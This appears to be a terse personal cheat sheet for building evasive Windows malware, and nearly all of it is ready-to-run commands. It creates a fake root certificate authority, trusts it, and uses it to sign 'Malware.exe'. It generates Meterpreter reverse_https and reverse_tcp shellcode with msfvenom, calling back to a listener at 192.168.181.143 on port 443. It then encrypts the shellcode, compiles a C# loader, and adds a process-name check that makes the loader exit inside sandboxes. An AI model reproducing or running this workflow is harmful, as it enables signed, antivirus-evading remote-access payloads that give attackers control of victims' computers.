
#Signing the Executable

makecert -r -pe -n "CN=Malwr CA" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv MalwrCA.pvk MalwrCA.cer

certutil -user -addstore Root MalwrCA.cer

makecert -pe -n "CN=Malwr Cert" -a sha256 -cy end -sky signature -ic MalwrCA.cer -iv MalwrCA.pvk -sv MalwrCert.pvk MalwrCert.cer

pvk2pfx -pvk MalwrCert.pvk -spc MalwrCert.cer -pfx MalwrCert.pfx

signtool sign /v /f MalwrCert.pfx /t http://timestamp.comodoca.com/authenticode Malware.exe

---------------------------------------------------------------------------------------------------------------------------------------

#MSF Venom Payloads

msfvenom -p windows/x64/meterpreter/reverse_https lhost=eth0 lport=443 -f csharp

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.181.143 LPORT=443 -f raw -o payload

msfvenom -p windows/x64/messagebox TEXT=hello TITLE=hello -f c -v SHELLCODE

---------------------------------------------------------------------------------------------------------------------------------------

#Locations

F:\encrypt-main\encrypt 

C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build
Vcvars64.bat

C:\Program Files (x86)\Windows Kits\10\bin\10.0.19041.0\x64

----------------------------------------------------------------------------------------------------------------------------------------

#Running encrypt

encrypt.exe -l cs -m file -i payload.bin -e random -o file

#Compiling C# Scripts

csc.exe /out:F:\encrypt-main\encrypt\shellcodee-encrypted.exe F:\encrypt-main\encrypt\shellcodee-encrypted.cs

------------------------------------------------------------------------------------------------------------------------------------------



            var testproc = System.Diagnostics.Process.GetCurrentProcess();
            string proc_name = testproc.ProcessName;

            if (proc_name != "test.exe"){
                Environment.Exit(0);
            }